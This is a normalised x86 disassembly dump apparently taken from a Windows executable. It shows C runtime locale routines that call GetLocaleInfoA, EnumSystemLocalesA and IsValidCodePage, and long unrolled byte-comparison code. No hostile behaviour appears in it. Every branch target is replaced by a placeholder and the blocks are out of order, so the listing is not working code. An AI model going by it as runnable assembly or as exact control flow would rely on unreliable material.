test eax eax
je r-xdata
push [ esi ]
or [ esi + 0x8 ] 0x2
mov [ esi + 0x1c ] edi
call sub_4258f0
pop ecx
cmp eax [ esi + 0xc ]
jne r-xdata
push ebx
mov [ esi + 0x18 ] edi
push 0x1
jmp r-xdata
or edx 0x1
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] edi
jmp r-xdata
push edi
mov ecx esi
call sub_431ba0
pop ecx
pop ecx
test eax eax
je r-xdata
sub_431de6
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
mov edi [ ebp + 0x8 ]
call sub_42a735
mov esi eax
mov edx edi
add esi 0x9c
call sub_431ab9
mov edi eax
push 0x78
lea eax [ ebp - 0x7c ]
push eax
mov eax [ esi + 0x10 ]
neg eax
sbb eax eax
and eax 0xfffff002
add eax 0x1001
push eax
push edi
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_437ee2
pop ecx
pop ecx
test eax eax
jne r-xdata
and [ esi + 0x8 ] eax
inc eax
jmp r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_4234de
leave
retn 0x4
mov eax [ esi + 0x8 ]
shr eax 0x2
not eax
and eax 0x1
cmp [ esi + 0xc ] 0x0
je r-xdata
or [ esi + 0x8 ] 0x4
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
push 0x1
jmp r-xdata
lea eax [ ebp - 0x7c ]
push eax
push [ esi ]
call sub_437ee2
pop ecx
pop ecx
test eax eax
jne r-xdata
push edi
mov ecx esi
call sub_431ba0
pop ecx
pop ecx
test eax eax
je r-xdata
push eax
sub_431ea7
push [ esi ]
call sub_4258f0
push [ esi + 0x4 ]
sub eax 0x3
neg eax
sbb eax eax
inc eax
mov [ esi + 0x10 ] eax
call sub_4258f0
sub eax 0x3
neg eax
sbb eax eax
and [ esi + 0x18 ] 0x0
inc eax
cmp [ esi + 0x10 ] 0x0
pop ecx
pop ecx
mov [ esi + 0x14 ] eax
je r-xdata
mov edx [ esi ]
call sub_431aed
push 0x2
pop eax
jmp r-xdata
and [ esi + 0x8 ] 0x0
test eax 0x200
je r-xdata
push 0x1
push sub_431c14
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
mov eax [ esi + 0x8 ]
test eax 0x100
je r-xdata
test al 0x7
jne r-xdata
retn
sub_431f0e
push [ esi ]
call sub_4258f0
sub eax 0x3
neg eax
sbb eax eax
inc eax
pop ecx
mov [ esi + 0x10 ] eax
je r-xdata
mov edx [ esi ]
call sub_431aed
push 0x2
pop eax
jmp r-xdata
retn
and [ esi + 0x8 ] 0x0
push 0x1
push sub_431de6
mov [ esi + 0xc ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
sub_431f4a
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_42a735
mov ebx [ ebp + 0x8 ]
mov esi eax
add esi 0x9c
test ebx ebx
jne r-xdata
lea eax [ ebx + 0x40 ]
lea edi [ esi + 0x4 ]
mov [ esi ] ebx
mov [ edi ] eax
test eax eax
je r-xdata
or [ esi + 0x8 ] 0x104
jmp r-xdata
mov eax [ esi ]
and [ esi + 0x8 ] 0x0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
call [ GetUserDefaultLCID@IAT ]
mov [ esi + 0x18 ] eax
mov [ esi + 0x1c ] eax
mov edi [ edi ]
test edi edi
je r-xdata
cmp [ eax ] 0x0
je r-xdata
push edi
push 0x16
push r--data
call sub_43198f
add esp 0xc
xor eax eax
mov ecx ebx
sub ebx 0xffffff80
neg ecx
sbb ecx ecx
and ecx ebx
mov edi esi
call sub_4319f1
mov edi eax
mov [ ebp + 0x8 ] edi
test edi edi
je r-xdata
mov [ esi + 0x8 ] 0x104
cmp [ edi ] 0x0
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
cmp edi 0xfde8
je r-xdata
push edi
call sub_4258f0
sub eax 0x3
neg eax
pop ecx
sbb eax eax
push 0x1
inc eax
push sub_431b08
mov [ esi + 0x14 ] eax
call [ EnumSystemLocalesA@IAT ]
test [ esi + 0x8 ] 0x4
jne r-xdata
call sub_431f0e
cmp [ eax ] 0x0
je r-xdata
cmp edi 0xfde9
je r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
and [ esi + 0x8 ] 0x0
jmp r-xdata
push esi
push 0x40
push r--data
call sub_43198f
add esp 0xc
test eax eax
je r-xdata
call sub_431ea7
jmp r-xdata
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
mov edi [ edi ]
test edi edi
je r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
push 0x1
push [ esi + 0x18 ]
call [ IsValidLocale@IAT ]
test eax eax
je r-xdata
call sub_431f0e
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
call sub_431ea7
jmp r-xdata
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov cx [ esi + 0x18 ]
mov [ eax ] cx
mov cx [ esi + 0x1c ]
mov [ eax + 0x2 ] cx
mov [ eax + 0x4 ] di
xor eax eax
inc eax
jmp r-xdata
mov edi [ GetLocaleInfoA@IAT ]
mov ecx 0x814
cmp [ eax ] cx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x40
push ebx
push 0x1001
push [ esi + 0x18 ]
call edi
test eax eax
je r-xdata
push r--data
push 0x40
push ebx
call sub_42aae1
add esp 0xc
test eax eax
je r-xdata
push 0x40
lea eax [ ebx + 0x40 ]
push eax
push 0x1002
push [ esi + 0x1c ]
call edi
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_423c0e
add esp 0x14
jmp r-xdata
push 0xa
push 0x10
sub ebx 0xffffff80
push ebx
push [ ebp + 0x8 ]
call sub_428d81
add esp 0x10
sub_43213b
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
mov eax edi
sub eax 0x0
je r-xdata
xor eax eax
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
movzx eax [ eax ]
movzx ecx [ ecx ]
jmp r-xdata
dec eax
je r-xdata
sub eax ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
pop edi
pop esi
pop ebp
retn
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
movzx eax [ ecx + 0x1 ]
movzx ecx [ esi + 0x1 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
dec eax
je r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
movzx eax [ ecx ]
movzx edx [ esi ]
sub eax edx
je r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
push ebx
push 0x20
pop edx
jmp r-xdata
movzx eax [ ecx + 0x2 ]
movzx ecx [ esi + 0x2 ]
jmp r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
movzx eax [ ecx + 0x1 ]
movzx edx [ esi + 0x1 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
cmp edi edx
jae r-xdata
movzx eax [ ecx + 0x2 ]
movzx edx [ esi + 0x2 ]
sub eax edx
je r-xdata
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
mov esi [ eax ]
cmp esi [ ecx ]
je r-xdata
add eax edi
add ecx edi
cmp edi 0x1f
ja r-xdata
movzx eax [ ecx + 0x3 ]
movzx ecx [ esi + 0x3 ]
xor edx edx
test eax eax
setg dl
lea edx [ edx + edx - 0x1 ]
mov eax edx
test eax eax
jne r-xdata
xor esi esi
movzx esi [ eax ]
movzx ebx [ ecx ]
sub esi ebx
je r-xdata
xor eax eax
jmp [ edi * 4 + jump_table_43373b ]
mov eax esi
jmp r-xdata
mov esi [ eax + 0x4 ]
cmp esi [ ecx + 0x4 ]
je r-xdata
movzx esi [ eax + 0x1 ]
movzx ebx [ ecx + 0x1 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
mov edx [ eax - 0x1c ]
cmp edx [ ecx - 0x1c ]
je r-xdata
mov edx [ eax - 0x18 ]
cmp edx [ ecx - 0x18 ]
je r-xdata
mov edx [ eax - 0x14 ]
cmp edx [ ecx - 0x14 ]
je r-xdata
mov edx [ eax - 0x10 ]
cmp edx [ ecx - 0x10 ]
je r-xdata
mov edx [ eax - 0xc ]
cmp edx [ ecx - 0xc ]
je r-xdata
mov edx [ eax - 0x8 ]
cmp edx [ ecx - 0x8 ]
je r-xdata
mov edx [ eax - 0x4 ]
cmp edx [ ecx - 0x4 ]
je r-xdata
mov edx [ eax - 0x1d ]
cmp edx [ ecx - 0x1d ]
je r-xdata
mov edx [ eax - 0x19 ]
cmp edx [ ecx - 0x19 ]
je r-xdata
mov edx [ eax - 0x15 ]
cmp edx [ ecx - 0x15 ]
je r-xdata
mov edx [ eax - 0x11 ]
cmp edx [ ecx - 0x11 ]
je r-xdata
mov edx [ eax - 0xd ]
cmp edx [ ecx - 0xd ]
je r-xdata
mov edx [ eax - 0x9 ]
cmp edx [ ecx - 0x9 ]
je r-xdata
mov edx [ eax - 0x5 ]
cmp edx [ ecx - 0x5 ]
je r-xdata
movzx ecx [ ecx - 0x1 ]
movzx eax [ eax - 0x1 ]
sub eax ecx
je r-xdata
mov edx [ eax - 0x1e ]
cmp edx [ ecx - 0x1e ]
je r-xdata
mov edx [ eax - 0x1a ]
cmp edx [ ecx - 0x1a ]
je r-xdata
mov edx [ eax - 0x16 ]
cmp edx [ ecx - 0x16 ]
je r-xdata
mov edx [ eax - 0x12 ]
cmp edx [ ecx - 0x12 ]
je r-xdata
mov edx [ eax - 0xe ]
cmp edx [ ecx - 0xe ]
je r-xdata
mov edx [ eax - 0xa ]
cmp edx [ ecx - 0xa ]
je r-xdata
mov edx [ eax - 0x6 ]
cmp edx [ ecx - 0x6 ]
je r-xdata
mov dx [ eax - 0x2 ]
cmp dx [ ecx - 0x2 ]
je r-xdata
mov edx [ eax - 0x1f ]
cmp edx [ ecx - 0x1f ]
je r-xdata
mov edx [ eax - 0x1b ]
cmp edx [ ecx - 0x1b ]
je r-xdata
mov edx [ eax - 0x17 ]
cmp edx [ ecx - 0x17 ]
je r-xdata
mov edx [ eax - 0x13 ]
cmp edx [ ecx - 0x13 ]
je r-xdata
mov edx [ eax - 0xf ]
cmp edx [ ecx - 0xf ]
je r-xdata
mov edx [ eax - 0xb ]
cmp edx [ ecx - 0xb ]
je r-xdata
mov edx [ eax - 0x7 ]
cmp edx [ ecx - 0x7 ]
je r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
pop ebx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x4 ]
movzx ebx [ ecx + 0x4 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x2 ]
movzx ebx [ ecx + 0x2 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xc ]
movzx esi [ eax - 0xc ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor eax eax
movzx esi dl
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xa ]
movzx esi [ eax - 0xa ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
movzx edx [ ecx - 0x2 ]
movzx esi [ eax - 0x2 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0x1f ]
movzx esi [ eax - 0x1f ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor esi esi
movzx edx [ ecx - 0xf ]
movzx esi [ eax - 0xf ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor esi esi
movzx esi dl
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
mov esi [ eax + 0x8 ]
cmp esi [ ecx + 0x8 ]
je r-xdata
movzx esi [ eax + 0x5 ]
movzx ebx [ ecx + 0x5 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x3 ]
movzx ebx [ ecx + 0x3 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x9 ]
movzx esi [ eax - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
movzx esi [ eax - 0x1e ]
movzx edx [ ecx - 0x1e ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov eax edx
jmp r-xdata
xor esi esi
movzx esi [ eax + 0x8 ]
movzx ebx [ ecx + 0x8 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x6 ]
movzx ebx [ ecx + 0x6 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
